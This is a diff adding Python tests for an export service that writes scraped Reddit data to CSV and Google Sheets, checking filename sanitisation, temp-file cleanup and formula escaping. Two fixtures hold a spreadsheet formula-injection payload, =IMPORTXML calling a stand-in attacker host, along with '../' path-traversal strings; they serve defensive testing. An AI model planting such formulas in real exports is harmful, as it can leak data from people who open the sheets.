@@ -1,6 +1,9 @@
+import csv
+import json
+import re
 from unittest.mock import AsyncMock, MagicMock, patch
 
-from export_sheets import ExportService
+from export_sheets import ExportService, _safe_worksheet_name
 
 
 async def test_export_service_writes_csv_and_returns_warning_when_sheets_fails(tmp_path):
@@ -36,6 +39,7 @@ async def test_export_service_writes_csv_and_returns_warning_when_sheets_fails(t
 
     assert result.row_count == 1
     assert result.csv_path.endswith(".csv")
+    assert re.search(r"export_python_\d{8}_\d{6}_\d{6}\.csv$", result.csv_path)
     assert result.warning is not None
     assert result.sheet_url is None
 
@@ -54,6 +58,143 @@ async def test_export_service_works_without_sheets_config(tmp_path):
     assert result.row_count == 0
     assert result.warning is None
     assert result.sheet_url is None
+
+
+async def test_export_service_sanitizes_scope_filename(tmp_path):
+    db = AsyncMock()
+    db.list_export_rows.return_value = []
+    service = ExportService(db=db, reports_dir=str(tmp_path), min_wtp=8)
+
+    result = await service.export(subreddit="../bad/scope")
+
+    assert result.csv_path.startswith(str(tmp_path))
+    assert ".." not in result.csv_path.replace(str(tmp_path), "")
+    assert "bad_scope" in result.csv_path
+
+
+def test_safe_worksheet_name_sanitizes_scope_and_prefix():
+    name = _safe_worksheet_name("../bad prefix", "../bad/scope?*[]")
+
+    assert name == "bad_prefix_bad_scope"
+    assert len(_safe_worksheet_name("p" * 120, "s" * 120)) <= 100
+
+
+async def test_export_service_escapes_spreadsheet_formulas_in_csv(tmp_path):
+    db = AsyncMock()
+    db.list_export_rows.return_value = [
+        {
+            "created_at": "2026-02-24T00:00:00",
+            "subreddit": "python",
+            "source": "reddit",
+            "post_id": "abc",
+            "title": "=IMPORTXML(\"https://attacker.example\")",
+            "summary": "  @SUM(1,1)",
+            "pain_level": "=1+1",
+            "willingness_to_pay": "+1",
+            "niche_category": "+Finance",
+            "competitor_tags": "[]",
+            "category": "complaint",
+            "severity": "high",
+            "opportunity_score": "-2",
+            "triage_status": "new",
+            "deep_dive_status": "not_requested",
+            "deep_dive_summary": "-cmd",
+            "url": "https://reddit.com/abc",
+        }
+    ]
+    service = ExportService(db=db, reports_dir=str(tmp_path), min_wtp=8)
+
+    result = await service.export()
+
+    with open(result.csv_path, newline="", encoding="utf-8") as handle:
+        row = next(csv.DictReader(handle))
+    assert row["title"].startswith("'=")
+    assert row["summary"].startswith("'  @")
+    assert row["pain_level"].startswith("'=")
+    assert row["willingness_to_pay"].startswith("'+")
+    assert row["niche_category"].startswith("'+")
+    assert row["opportunity_score"].startswith("'-")
+    assert row["deep_dive_summary"].startswith("'-")
+
+
+async def test_export_service_includes_promotion_gate_columns(tmp_path):
+    db = AsyncMock()
+    db.list_export_rows.return_value = [
+        {
+            "created_at": "2026-02-24T00:00:00",
+            "subreddit": "startups",
+            "source": "reddit",
+            "post_id": "founder_noise",
+            "title": "Launching my SaaS",
+            "summary": "No exact evidence",
+            "pain_level": 10,
+            "willingness_to_pay": 10,
+            "opportunity_score": 35.0,
+            "niche_category": "Compliance",
+            "competitor_tags": "[]",
+            "category": "complaint",
+            "severity": "high",
+            "analysis_payload_json": json.dumps(
+                {
+                    "promotion_eligible": False,
+                    "evidence_rejection_reason": "insufficient_first_hand_evidence",
+                }
+            ),
+            "triage_status": "new",
+            "deep_dive_status": "not_requested",
+            "deep_dive_summary": "",
+            "url": "https://reddit.com/founder_noise",
+        }
+    ]
+    service = ExportService(db=db, reports_dir=str(tmp_path), min_wtp=8)
+
+    result = await service.export()
+
+    with open(result.csv_path, newline="", encoding="utf-8") as handle:
+        row = next(csv.DictReader(handle))
+    assert row["opportunity_score"] == "35.0"
+    assert row["promotion_eligible"] == "False"
+    assert row["evidence_rejection_reason"] == "insufficient_first_hand_evidence"
+
+
+async def test_export_service_cleans_tmp_file_on_atomic_replace_error(tmp_path, monkeypatch):
+    db = AsyncMock()
+    db.list_export_rows.return_value = [
+        {
+            "created_at": "2026-02-24T00:00:00",
+            "subreddit": "python",
+            "source": "reddit",
+            "post_id": "abc",
+            "title": "Need better sync",
+            "summary": "Summary",
+            "pain_level": 8,
+            "willingness_to_pay": 9,
+            "niche_category": "DevOps",
+            "competitor_tags": "[]",
+            "category": "complaint",
+            "severity": "high",
+            "triage_status": "new",
+            "deep_dive_status": "not_requested",
+            "deep_dive_summary": "",
+            "url": "https://reddit.com/abc",
+        }
+    ]
+    service = ExportService(db=db, reports_dir=str(tmp_path), min_wtp=8)
+
+    def fail_replace(src, dst):
+        raise OSError("replace failed")
+
+    monkeypatch.setattr("export_sheets.os.replace", fail_replace)
+
+    try:
+        await service.export()
+    except OSError as exc:
+        assert "replace failed" in str(exc)
+    else:
+        raise AssertionError("Expected export to propagate atomic replace failure")
+
+    assert list(tmp_path.glob("*.tmp")) == []
+    assert list(tmp_path.glob("*.csv")) == []
 
 
 async def test_export_service_returns_sheet_url_on_success(tmp_path):
@@ -118,3 +259,105 @@ async def test_upsert_google_sheet_is_sync_method(tmp_path):
     assert not _asyncio.iscoroutinefunction(service._upsert_google_sheet), (
         "_upsert_google_sheet must stay synchronous"
     )
+
+
+def test_upsert_google_sheet_escapes_spreadsheet_formulas(tmp_path):
+    db = MagicMock()
+    service = ExportService(
+        db=db,
+        reports_dir=str(tmp_path),
+        min_wtp=8,
+        sheets_credentials_json='{"type": "service_account"}',
+        sheets_spreadsheet_id="sheet-id",
+    )
+    worksheet = MagicMock()
+    spreadsheet = MagicMock()
+    spreadsheet.worksheet.return_value = worksheet
+    client = MagicMock()
+    client.open_by_key.return_value = spreadsheet
+    fake_gspread = MagicMock()
+    fake_gspread.WorksheetNotFound = RuntimeError
+    fake_gspread.service_account_from_dict.return_value = client
+
+    with patch("export_sheets.gspread", fake_gspread):
+        service._upsert_google_sheet(
+            rows=[
+                {
+                    "created_at": "2026-02-24T00:00:00",
+                    "subreddit": "python",
+                    "source": "reddit",
+                    "post_id": "abc",
+                    "title": "=IMPORTXML(\"https://attacker.example\")",
+                    "summary": "@SUM(1,1)",
+                    "pain_level": 8,
+                    "willingness_to_pay": 9,
+                    "niche_category": "-Finance",
+                    "competitor_tags": "[]",
+                    "category": "complaint",
+                    "severity": "high",
+                    "triage_status": "new",
+                    "deep_dive_status": "not_requested",
+                    "deep_dive_summary": "+cmd",
+                    "url": "https://reddit.com/abc",
+                }
+            ],
+            headers=[
+                "created_at",
+                "subreddit",
+                "source",
+                "post_id",
+                "title",
+                "summary",
+                "pain_level",
+                "willingness_to_pay",
+                "niche_category",
+                "competitor_tags",
+                "category",
+                "severity",
+                "opportunity_score",
+                "promotion_eligible",
+                "evidence_rejection_reason",
+                "triage_status",
+                "deep_dive_status",
+                "deep_dive_summary",
+                "url",
+            ],
+            subreddit=None,
+        )
+
+    values = worksheet.update.call_args.args[1]
+    header_row = values[0]
+    data_row = values[1]
+    assert data_row[header_row.index("title")].startswith("'=")
+    assert data_row[header_row.index("summary")].startswith("'@")
+    assert data_row[header_row.index("niche_category")].startswith("'-")
+    assert data_row[header_row.index("deep_dive_summary")].startswith("'+")
+
+
+def test_upsert_google_sheet_uses_safe_worksheet_name(tmp_path):
+    db = MagicMock()
+    service = ExportService(
+        db=db,
+        reports_dir=str(tmp_path),
+        min_wtp=8,
+        sheets_credentials_json='{"type": "service_account"}',
+        sheets_spreadsheet_id="sheet-id",
+        sheets_worksheet_prefix="../bad prefix",
+    )
+    worksheet = MagicMock()
+    spreadsheet = MagicMock()
+    spreadsheet.worksheet.return_value = worksheet
+    client = MagicMock()
+    client.open_by_key.return_value = spreadsheet
+    fake_gspread = MagicMock()
+    fake_gspread.WorksheetNotFound = RuntimeError
+    fake_gspread.service_account_from_dict.return_value = client
+
+    with patch("export_sheets.gspread", fake_gspread):
+        service._upsert_google_sheet(
+            rows=[],
+            headers=["created_at"],
+            subreddit="../bad/scope?*[]",
+        )
+
+    spreadsheet.worksheet.assert_called_once_with("bad_prefix_bad_scope")
